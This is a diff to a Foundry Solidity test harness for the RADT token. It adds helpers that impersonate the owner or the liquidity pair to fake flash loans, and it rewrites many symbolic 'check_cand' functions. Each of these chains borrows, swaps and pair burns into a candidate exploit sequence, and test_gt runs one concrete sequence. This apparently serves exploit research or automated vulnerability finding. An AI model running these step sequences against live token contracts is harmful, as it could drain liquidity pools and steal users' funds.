@@ -75,12 +75,10 @@ contract RADTDAOTest is Test, BlockLoader {
         attackContract = new AttackContract();
         attackContractAddr = address(attackContract);
         attacker = address(attackContract);
-        radt.afterDeploy(address(pair), address(wrapper));
         // Initialize balances and mock flashloan.
         usdt.transfer(address(pair), balanceOfusdtpair);
         radt.transfer(address(pair), balanceOfradtpair);
-        usdt.approve(attacker, UINT256_MAX);
-        radt.approve(attacker, UINT256_MAX);
+        radt.afterDeploy(address(pair), address(wrapper));
     }
 
     function printBalance(string memory tips) public {
@@ -145,20 +143,48 @@ contract RADTDAOTest is Test, BlockLoader {
         return;
     }
 
-    function borrow_usdt(uint256 amount) internal {
-        usdt.transferFrom(owner, attacker, amount);
+    function borrow_owner_usdt(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        usdt.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_usdt(uint256 amount) internal {
+    function payback_owner_usdt(uint256 amount) internal {
         usdt.transfer(owner, amount);
     }
 
-    function borrow_radt(uint256 amount) internal {
-        radt.transferFrom(owner, attacker, amount);
+    function borrow_owner_radt(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(owner);
+        radt.transfer(attacker, amount);
+        vm.startPrank(attacker);
     }
 
-    function payback_radt(uint256 amount) internal {
+    function payback_owner_radt(uint256 amount) internal {
         radt.transfer(owner, amount);
+    }
+
+    function borrow_pair_usdt(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(pair));
+        usdt.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_pair_usdt(uint256 amount) internal {
+        usdt.transfer(address(pair), amount);
+    }
+
+    function borrow_pair_radt(uint256 amount) internal {
+        vm.stopPrank();
+        vm.prank(address(pair));
+        radt.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_pair_radt(uint256 amount) internal {
+        radt.transfer(address(pair), amount);
     }
 
     function swap_pair_usdt_radt(uint256 amount) internal {
@@ -199,7 +225,7 @@ contract RADTDAOTest is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_usdt(1000e18);
+        borrow_owner_usdt(1000e18);
         printBalance("After step0 ");
         swap_pair_usdt_radt(usdt.balanceOf(attacker));
         printBalance("After step1 ");
@@ -209,7 +235,7 @@ contract RADTDAOTest is Test, BlockLoader {
         printBalance("After step3 ");
         swap_pair_radt_usdt(radt.balanceOf(attacker));
         printBalance("After step4 ");
-        payback_usdt((1000e18 * 1003) / 1000);
+        payback_owner_usdt((1000e18 * 1003) / 1000);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
@@ -224,50 +250,32 @@ contract RADTDAOTest is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
+        borrow_owner_usdt(amt0);
         swap_pair_usdt_radt(amt1);
         burn_pair_radt(amt2);
         sync_pair();
         swap_pair_radt_usdt(amt3);
-        payback_usdt(amt4);
+        payback_owner_usdt(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand000(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
-    ) public {
+    function check_cand000(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_radt(amt1);
-        burn_pair_radt(amt2);
-        swap_pair_radt_usdt(amt3);
-        payback_usdt(amt4);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_owner_radt(amt0);
+        burn_pair_radt(amt1);
+        payback_owner_radt(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand001(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
-    ) public {
+    function check_cand001(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_radt(amt1);
-        burn_pair_radt(amt2);
-        swap_pair_radt_usdt(amt3);
-        swap_pair_radt_usdt(amt4);
-        payback_usdt(amt5);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_pair_radt(amt0);
+        burn_pair_radt(amt1);
+        payback_pair_radt(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -276,37 +284,25 @@ contract RADTDAOTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_radt(amt1);
-        burn_pair_radt(amt2);
-        sync_pair();
-        swap_pair_radt_usdt(amt3);
-        payback_usdt(amt4);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_owner_radt(amt0);
+        burn_pair_radt(amt1);
+        swap_pair_radt_usdt(amt2);
+        payback_owner_radt(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand003(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
-    ) public {
+    function check_cand003(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_radt(amt1);
-        burn_pair_radt(amt2);
-        burn_pair_radt(amt3);
-        swap_pair_radt_usdt(amt4);
-        payback_usdt(amt5);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_owner_radt(amt0);
+        burn_pair_radt(amt1);
+        sync_pair();
+        payback_owner_radt(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -315,41 +311,25 @@ contract RADTDAOTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_radt(amt1);
-        burn_pair_radt(amt2);
-        sync_pair();
-        swap_pair_radt_usdt(amt3);
-        swap_pair_radt_usdt(amt4);
-        payback_usdt(amt5);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_pair_radt(amt0);
+        burn_pair_radt(amt1);
+        swap_pair_radt_usdt(amt2);
+        payback_pair_radt(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
 
-    function check_cand005(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
-    ) public {
+    function check_cand005(uint256 amt0, uint256 amt1, uint256 amt2) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_radt(amt1);
-        burn_pair_radt(amt2);
-        burn_pair_radt(amt3);
-        swap_pair_radt_usdt(amt4);
-        swap_pair_radt_usdt(amt5);
-        payback_usdt(amt6);
+        vm.assume(amt2 == (amt0 * 1003) / 1000);
+        borrow_pair_radt(amt0);
+        burn_pair_radt(amt1);
+        sync_pair();
+        payback_pair_radt(amt2);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -359,18 +339,15 @@ contract RADTDAOTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt5 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_owner_usdt(amt0);
         swap_pair_usdt_radt(amt1);
         burn_pair_radt(amt2);
-        burn_pair_radt(amt3);
-        sync_pair();
-        swap_pair_radt_usdt(amt4);
-        payback_usdt(amt5);
+        swap_pair_radt_usdt(amt3);
+        payback_owner_usdt(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -380,19 +357,15 @@ contract RADTDAOTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_radt(amt1);
-        burn_pair_radt(amt2);
-        burn_pair_radt(amt3);
-        burn_pair_radt(amt4);
-        swap_pair_radt_usdt(amt5);
-        payback_usdt(amt6);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_owner_radt(amt0);
+        burn_pair_radt(amt1);
+        swap_pair_radt_usdt(amt2);
+        swap_pair_radt_usdt(amt3);
+        payback_owner_radt(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -401,21 +374,15 @@ contract RADTDAOTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_radt(amt1);
-        burn_pair_radt(amt2);
-        burn_pair_radt(amt3);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_owner_radt(amt0);
+        burn_pair_radt(amt1);
         sync_pair();
-        swap_pair_radt_usdt(amt4);
-        swap_pair_radt_usdt(amt5);
-        payback_usdt(amt6);
+        swap_pair_radt_usdt(amt2);
+        payback_owner_radt(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -425,21 +392,15 @@ contract RADTDAOTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_pair_usdt(amt0);
         swap_pair_usdt_radt(amt1);
         burn_pair_radt(amt2);
-        burn_pair_radt(amt3);
-        burn_pair_radt(amt4);
-        swap_pair_radt_usdt(amt5);
-        swap_pair_radt_usdt(amt6);
-        payback_usdt(amt7);
+        swap_pair_radt_usdt(amt3);
+        payback_pair_usdt(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -449,20 +410,15 @@ contract RADTDAOTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt6 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_radt(amt1);
-        burn_pair_radt(amt2);
-        burn_pair_radt(amt3);
-        burn_pair_radt(amt4);
-        sync_pair();
-        swap_pair_radt_usdt(amt5);
-        payback_usdt(amt6);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_pair_radt(amt0);
+        burn_pair_radt(amt1);
+        swap_pair_radt_usdt(amt2);
+        swap_pair_radt_usdt(amt3);
+        payback_pair_radt(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -471,22 +427,15 @@ contract RADTDAOTest is Test, BlockLoader {
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
+        uint256 amt3
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_radt(amt1);
-        burn_pair_radt(amt2);
-        burn_pair_radt(amt3);
-        burn_pair_radt(amt4);
-        burn_pair_radt(amt5);
-        swap_pair_radt_usdt(amt6);
-        payback_usdt(amt7);
+        vm.assume(amt3 == (amt0 * 1003) / 1000);
+        borrow_pair_radt(amt0);
+        burn_pair_radt(amt1);
+        sync_pair();
+        swap_pair_radt_usdt(amt2);
+        payback_pair_radt(amt3);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -497,21 +446,16 @@ contract RADTDAOTest is Test, BlockLoader {
         uint256 amt2,
         uint256 amt3,
         uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
+        uint256 amt5
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
+        vm.assume(amt5 == (amt0 * 1003) / 1000);
+        borrow_owner_usdt(amt0);
         swap_pair_usdt_radt(amt1);
         burn_pair_radt(amt2);
-        burn_pair_radt(amt3);
-        burn_pair_radt(amt4);
-        sync_pair();
-        swap_pair_radt_usdt(amt5);
-        swap_pair_radt_usdt(amt6);
-        payback_usdt(amt7);
+        swap_pair_radt_usdt(amt3);
+        swap_pair_radt_usdt(amt4);
+        payback_owner_usdt(amt5);
         assert(!attackGoal());
         vm.stopPrank();
     }
@@ -521,75 +465,16 @@ contract RADTDAOTest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7,
-        uint256 amt8
+        uint256 amt4
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt8 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
+        vm.assume(amt4 == (amt0 * 1003) / 1000);
+        borrow_owner_usdt(amt0);
         swap_pair_usdt_radt(amt1);
         burn_pair_radt(amt2);
-        burn_pair_radt(amt3);
-        burn_pair_radt(amt4);
-        burn_pair_radt(amt5);
-        swap_pair_radt_usdt(amt6);
-        swap_pair_radt_usdt(amt7);
-        payback_usdt(amt8);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand014(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt7 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_radt(amt1);
-        burn_pair_radt(amt2);
-        burn_pair_radt(amt3);
-        burn_pair_radt(amt4);
-        burn_pair_radt(amt5);
         sync_pair();
-        swap_pair_radt_usdt(amt6);
-        payback_usdt(amt7);
-        assert(!attackGoal());
-        vm.stopPrank();
-    }
-
-    function check_cand015(
-        uint256 amt0,
-        uint256 amt1,
-        uint256 amt2,
-        uint256 amt3,
-        uint256 amt4,
-        uint256 amt5,
-        uint256 amt6,
-        uint256 amt7,
-        uint256 amt8
-    ) public {
-        vm.startPrank(attacker);
-        vm.assume(amt8 == (amt0 * 1003) / 1000);
-        borrow_usdt(amt0);
-        swap_pair_usdt_radt(amt1);
-        burn_pair_radt(amt2);
-        burn_pair_radt(amt3);
-        burn_pair_radt(amt4);
-        burn_pair_radt(amt5);
-        sync_pair();
-        swap_pair_radt_usdt(amt6);
-        swap_pair_radt_usdt(amt7);
-        payback_usdt(amt8);
+        swap_pair_radt_usdt(amt3);
+        payback_owner_usdt(amt4);
         assert(!attackGoal());
         vm.stopPrank();
     }
